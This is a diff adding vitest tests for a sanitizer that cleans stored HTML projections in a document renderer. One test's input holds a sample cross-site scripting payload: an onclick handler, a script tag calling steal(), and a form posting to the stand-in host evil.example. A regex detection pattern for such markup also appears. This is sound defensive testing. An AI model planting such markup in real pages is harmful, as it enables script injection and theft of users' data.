@@ -12,6 +12,7 @@ import { describe, expect, it } from "vitest";
 import { safeAssetResponse } from "./assets.js";
 import { verifyRenderedProjection } from "./publish.js";
 import { renderCanonicalHtml, renderProjection } from "./renderers.js";
+import { sanitizeStoredProjectionHtml } from "./safety.js";
 
 const fixtureRoot = resolve(
   import.meta.dirname,
@@ -96,6 +97,24 @@ describe("deterministic renderer", () => {
       expect(left.segments).toEqual(right.segments);
       expect(left.reviewable).toBe(true);
       expect(() => verifyRenderedProjection(snapshot, left)).not.toThrow();
+      if (kind === "html") {
+        const sanitized = sanitizeStoredProjectionHtml(left.bytes, {
+          id: "projection_html_test",
+          role: left.role,
+          mediaType: left.mediaType,
+          path: "projections/document.html",
+          reviewable: left.reviewable,
+          generatedFromRevision: snapshot.manifest.revision,
+          revision: left.revision,
+          segments: [...left.segments],
+        });
+        expect(sanitized.reviewable).toBe(true);
+        expect(sanitized.html).not.toMatch(/<script|<form|\son[a-z]+=/iu);
+        for (const segment of left.segments)
+          expect(sanitized.html).toContain(
+            `data-dstar-segment="${segment.id}"`,
+          );
+      }
     }
   });
 
@@ -217,5 +236,43 @@ describe("deterministic renderer", () => {
       headers: { "Content-Disposition": "inline", "Content-Type": "image/png" },
     });
     expect(safeAssetResponse(snapshot, "../secret").status).toBe(404);
+  });
+
+  it("sanitizes untrusted stored HTML and disables review when mappings do not survive", () => {
+    const projection = {
+      id: "projection_attack",
+      role: "reading",
+      mediaType: "text/html",
+      path: "projections/attack.html",
+      reviewable: true,
+      generatedFromRevision:
+        "sha256:0000000000000000000000000000000000000000000000000000000000000000",
+      revision:
+        "sha256:0000000000000000000000000000000000000000000000000000000000000000",
+      segments: [
+        {
+          id: "segment_attack",
+          selectors: [
+            { type: "FragmentSelector", value: "segment_attack" },
+            { type: "TextQuoteSelector", exact: "Safe words" },
+          ],
+          derivedFrom: [
+            {
+              relation: "exact",
+              selector: { type: "NodeSelector", node: "node_attack" },
+            },
+          ],
+        },
+      ],
+    } as const;
+    const result = sanitizeStoredProjectionHtml(
+      new TextEncoder().encode(
+        '<p onclick="alert(1)">Safe words</p><script>steal()</script><form action="https://evil.example"><input></form>',
+      ),
+      projection,
+    );
+    expect(result.html).not.toMatch(/script|onclick|form|input/iu);
+    expect(result.reviewable).toBe(false);
+    expect(result.diagnostics).not.toHaveLength(0);
   });
 });
